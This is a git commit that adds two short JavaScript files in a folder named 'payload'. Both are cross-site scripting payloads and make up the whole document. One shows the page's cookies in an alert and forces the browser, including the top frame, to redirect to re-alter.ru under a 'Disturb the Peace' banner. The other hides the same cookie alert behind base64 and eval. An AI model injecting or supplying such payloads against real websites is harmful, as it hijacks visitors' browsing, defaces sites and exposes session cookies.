9ce1d7f35d0c72c7aff90a6c600cb15641be9c0c
RE:[ALT]ER <66887455+re-alter@users.noreply.github.com>
2024-06-27 16:56:45 +0300

    Add files via upload

---
+++ payload/ar.js
@@ -0,0 +1,4 @@
+/*!
+ - [ JavaScript ] Console log and a bunch of redirects
+ */
+console.log('%c [ 𝕯𝖎𝖘𝖙𝖚𝖗𝖇 𝖙𝖍𝖊 𝕻𝖊𝖆𝖈𝖊 | re-alter.ru ] ','font-size:22px;color:#ff003b;background:#000000;font-family:monospace;text-decoration:none;padding: 2px 4px 3px 4px;border:2px solid #ff003b');alert(document.cookie);window.location='https://re-alter.ru';location='https://re-alter.ru';top.location='https://re-alter.ru';
---
+++ payload/ca.js
@@ -0,0 +1,4 @@
+/*!
+ - [ JavaScript ] Console log and alert
+ */
+eval(atob('Y29uc29sZS5sb2coJyBbIERhcmtuZXNzIGx1cmtpbmcgYmVsb3cgdGhlIHN1cmZhY2U/IF0gJyk7YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));
